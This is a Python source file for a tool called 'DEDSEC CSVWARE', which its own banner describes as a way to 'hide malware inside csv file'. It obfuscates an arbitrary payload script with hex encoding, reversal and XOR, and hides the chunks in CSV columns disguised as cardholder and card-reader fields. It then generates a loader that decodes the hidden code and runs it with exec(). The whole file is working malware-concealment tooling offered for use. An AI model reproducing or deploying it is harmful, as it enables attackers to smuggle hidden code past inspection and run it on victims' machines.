#coder: 0xbit
import os, sys, textwrap, csv, ast

green_dot = '\033[92m●\033[0m'
green_q = '\033[92m?\033[0m'
red_dot = '\033[91m●\033[0m'

os.system('clear')

def banner():
    banner = '''
    
        \033[92m   ⣀⣀⣤⣤⣤⣶⣶⣿⣿⣿\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        \033[92m⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m⠀⠀
        \033[92m⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m⠀⠀
        \033[92m⢸⣿⣿⣏⠉⠙⣿⣿⠉⠉⣿⣿⣿\033[0m⠀
        \033[92m⢸⣿⣿⣿⣆⠀⠸⠃⢀⣾⣿⣿⣿\033[0m⠀⠀\033[92mDEDSEC CSVWARE\033[0m
        \033[92m⢸⣿⣿⣿⣿⠆⠀⠀⢾⣿⣿⣿⣿\033[0m⠀⠀hide malware inside csv file
        \033[92m⢸⣿⣿⣿⠏⠀⣰⡄⠀⢿⣿⣿⣿\033[0m⠀⠀
        \033[92m⢸⣿⣿⣃⣀⣰⣿⣷⣀⣀⣻⣿⣿\033[0m⠀⠀
        \033[92m⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m⠀
        \033[92m⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m⠀⠀
        \033[92m⠀⠀⠀⠉⠉⠛⠛⠛⠿⠿⣿⣿⣿\033[0m⠀v.1.0⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Coded: by 0xbit
        
        
          1. INJECT PAYLOAD
          0. EXIT'''
    print((banner))
        
all_headers = ['card-id', 
            'door-id', 
            'id-code', 
            'post-id', 
            'card-reader-index', 
            'paytoswipe-id',
            'swipe-index',
            'swipe-addrs-value',
            'cardholder-ssn',
            'cardholder-pan',
            'cardholder-zip',
            'cardholder-idhex',]

payload_code_um = '''
import csv, binascii, os

def extract_hidden_code():
    all_headers = ['card-id', 
                'door-id', 
                'id-code', 
                'post-id', 
                'card-reader-index', 
                'paytoswipe-id',
                'swipe-index',
                'swipe-addrs-value',
                'cardholder-ssn',
                'cardholder-pan',
                'cardholder-zip',
                'cardholder-idhex',]
                
    hex_chunks = []
    try:
        with open('REPLACEME', 'r', newline='') as csv_file:
            reader = csv.DictReader(csv_file);headers_in_file = reader.fieldnames;present_headers=[header for header in all_headers if header in headers_in_file]
            for header in all_headers:
                if header in present_headers:
                    for row in reader:
                        chunk = row.get(header, "").strip()
                        if chunk:
                            hex_chunks.append(chunk)
                    csv_file.seek(0)
                    next(reader)
    except FileNotFoundError and Exception:pass
    hex_string = ''.join(hex_chunks);reversed_hex = ''.join(f'{int(hex_string[i:i+2], 16) ^ 0x5A:02x}' for i in range(0, len(hex_string), 2));hex_string = reversed_hex[::-1];decoded_code = binascii.unhexlify(hex_string).decode('utf-8');exec(decoded_code)

extract_hidden_code()
'''

def detect_imports(file_path):
    try:
        with open(file_path, 'r') as file:
            file_content = file.readlines()
    except FileNotFoundError:
        sys.exit(f'\n\t [{red_dot}] file not found.\n')
        
    tree = ast.parse(''.join(file_content))
    
    imports = []
    seen_imports = set() 

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            line_number = node.lineno
            original_code = file_content[line_number - 1].strip()
            if original_code not in seen_imports:
                seen_imports.add(original_code)
                imports.append(original_code) 
                
        elif isinstance(node, ast.ImportFrom):
            module_name = node.module
            line_number = node.lineno
            original_code = file_content[line_number - 1].strip()
            if original_code not in seen_imports:
                seen_imports.add(original_code)
                imports.append(original_code) 

    return imports

class main_code:
    @staticmethod
    def injectcsv(custom_csv, payload_code, detected_imports):
        try:
            with open(custom_csv, 'r', newline='') as csv_file:
                reader = csv.reader(csv_file)
                headers = next(reader) 
                rows = list(reader)  
        except :
            sys.exit(f"\n\t [{red_dot}] CSV file not found.\n")

        try:
            with open(payload_code, 'r') as py_file:
                python_code = py_file.read()
        except FileNotFoundError:
            sys.exit(f"\n\t [{red_dot}] Payload file not found.\n")

        hex_code = python_code.encode('utf-8').hex()
        reversed_hex = hex_code[::-1]
        obfuscated_hex = ''.join(f'{int(reversed_hex[i:i+2], 16) ^ 0x5A:02x}' for i in range(0, len(reversed_hex), 2))
        hex_chunks = textwrap.wrap(obfuscated_hex, 5)

        for header in all_headers[1:]:
            if header not in headers:
                headers.append(header)

        num_headers = len(all_headers)
        num_rows = len(rows)
        hex_columns = {header: [] for header in all_headers}

        for idx, chunk in enumerate(hex_chunks):
            header_idx = idx // num_rows  
            row_idx = idx % num_rows      
            if header_idx < num_headers:
                header = all_headers[header_idx]
                hex_columns[header].append((row_idx, chunk))
            else:
                sys.exit(f"\n\t [{red_dot}] Not enough headers to store all hex chunks.\n")
                
        for header, chunks in hex_columns.items():
            for row_idx, chunk in chunks:
                if row_idx < num_rows:
                    rows[row_idx].append(chunk)
                else:
                    sys.exit(f"\n\t [{red_dot}] Row index {row_idx} out of range for header {header}.\n")

        for row in rows:
            while len(row) < len(headers):
                row.append('')
        try:
            if not os.path.exists(f'output'):
                os.mkdir('output')
            
            os.chdir('output')
            
            file_name = os.path.splitext(os.path.basename(payload_code))[0]
            with open(f'{file_name}.csv', 'w', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow(headers)  
                writer.writerows(rows)
            
            allimports = ''
            
            for imp in detected_imports:
                allimports += imp + '\n'
                    
                with open(f'{file_name}.py', 'w') as write:
                    payload_code_u = payload_code_um.replace('REPLACEME', f'{file_name}.csv')
                    write.write(allimports + payload_code_u)
                    
        except Exception as e:
            sys.exit(f"\n\t [{red_dot}] Error writing to output CSV.\n")
                
        print(f"\n\t [{green_dot}] Code injected to csv file: saved to '{file_name}.csv'.\n")
            
def main_builder():
    try:
        select = input(f'\n\t [{green_q}] DEDSEC: ').strip()
        maincode = main_code()
        
        if select == '1':
            custom_file = input(f"\n\t [{green_q}] CSV file: ")
            payload_file = input(f'\t [{green_q}] Payload file: ')
            detected_imports = detect_imports(payload_file)
            
            maincode.injectcsv(custom_file, payload_file, detected_imports)
        else:
            os.system('clear')
            sys.exit(f"\n\t [{red_dot}] Exiting.\n")
    except KeyboardInterrupt:
        sys.exit(f"\n\n\t [{red_dot}] Operation cancelled by user.\n")

if __name__ == "__main__":
    banner()
    main_builder()
    
